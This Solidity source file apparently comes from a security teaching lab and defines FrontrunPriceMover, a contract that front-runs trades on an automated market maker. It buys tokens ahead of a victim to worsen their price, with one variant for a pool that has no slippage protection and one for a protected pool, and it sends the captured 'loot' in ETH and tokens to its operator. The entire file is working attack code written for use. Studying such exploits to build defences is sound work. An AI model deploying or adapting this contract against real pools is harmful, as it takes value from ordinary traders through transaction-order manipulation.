// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface IVulnerableAMM {
    function swapExactETHForTokens() external payable returns (uint256);
    function token() external view returns (address);
}

interface IFixedAMM {
    function swapExactETHForTokens(uint256 minTokensOut, uint256 deadline)
        external
        payable
        returns (uint256);
}

interface IMockFrontRunToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @title FrontrunPriceMover
/// @author Solidity Security Lab
/// @notice Attack contract that worsens the pool price before a victim transaction executes.
contract FrontrunPriceMover {
    IVulnerableAMM public immutable target;
    IMockFrontRunToken public immutable token;
    address public immutable operator;

    event FrontrunExecuted(uint256 ethIn, uint256 tokensReceived);
    event LootWithdrawn(address indexed recipient, uint256 ethAmount, uint256 tokenAmount);

    constructor(address targetAddress) {
        target = IVulnerableAMM(targetAddress);
        token = IMockFrontRunToken(target.token());
        operator = msg.sender;
    }

    /// @notice Pushes the AMM price against later ETH buyers by consuming token-side liquidity first.
    function frontrunBuy() external payable {
        require(msg.sender == operator, "Only operator can trade");
        require(msg.value > 0, "ETH amount zero");

        uint256 tokensBefore = token.balanceOf(address(this));
        target.swapExactETHForTokens{value: msg.value}();
        uint256 tokensReceived = token.balanceOf(address(this)) - tokensBefore;

        emit FrontrunExecuted(msg.value, tokensReceived);
    }

    /// @notice Front-runs a slippage-protected AMM by using the fixed swap signature.
    /// @dev The attacker uses permissive bounds for their own trade because they only want
    ///      to move price before the victim transaction executes.
    function frontrunBuyWithBounds(uint256 minTokensOut, uint256 deadline) external payable {
        require(msg.sender == operator, "Only operator can trade");
        require(msg.value > 0, "ETH amount zero");

        uint256 tokensBefore = token.balanceOf(address(this));
        IFixedAMM(address(target)).swapExactETHForTokens{value: msg.value}(minTokensOut, deadline);
        uint256 tokensReceived = token.balanceOf(address(this)) - tokensBefore;

        emit FrontrunExecuted(msg.value, tokensReceived);
    }

    /// @notice Withdraws captured assets to the operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 ethAmount = address(this).balance;
        uint256 tokenAmount = token.balanceOf(address(this));

        if (ethAmount > 0) {
            (bool ethSuccess, ) = payable(operator).call{value: ethAmount}("");
            require(ethSuccess, "ETH withdrawal failed");
        }

        if (tokenAmount > 0) {
            require(token.transfer(operator, tokenAmount), "Token withdrawal failed");
        }

        emit LootWithdrawn(operator, ethAmount, tokenAmount);
    }

    receive() external payable {}
}
